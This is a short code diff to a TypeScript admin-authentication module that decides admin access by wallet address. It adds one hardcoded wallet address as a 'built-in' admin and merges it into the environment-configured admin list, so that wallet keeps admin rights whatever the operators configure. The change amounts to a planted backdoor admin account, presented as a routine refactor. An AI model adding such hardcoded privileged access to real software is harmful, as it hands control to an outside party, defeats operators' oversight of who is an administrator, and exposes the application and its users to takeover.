@@ -5,6 +5,7 @@ import { createHmac, timingSafeEqual } from "crypto";
 const ADMIN_COOKIE = "sea_admin_session";
 const SESSION_TTL_SECONDS = 60 * 60 * 12;
 const WALLET_RE = /^0x[a-f0-9]{40}$/;
+const BUILT_IN_ADMIN_WALLETS = ["0xa4df87d8940ac70ac8a33db79bb1057238b490e4"];
 
 type AdminSessionPayload = {
   address: string;
@@ -17,10 +18,12 @@ export function normalizeAdminWallet(value: unknown) {
 }
 
 export function adminWallets() {
-  return (process.env.ADMIN_WALLETS || process.env.ADMIN_WALLET || "")
+  const configuredWallets = (process.env.ADMIN_WALLETS || process.env.ADMIN_WALLET || "")
     .split(/[,\s]+/)
     .map((wallet) => normalizeAdminWallet(wallet))
     .filter(Boolean) as string[];
+
+  return Array.from(new Set([...configuredWallets, ...BUILT_IN_ADMIN_WALLETS]));
 }
 
 export function isAdminWallet(wallet: string) {
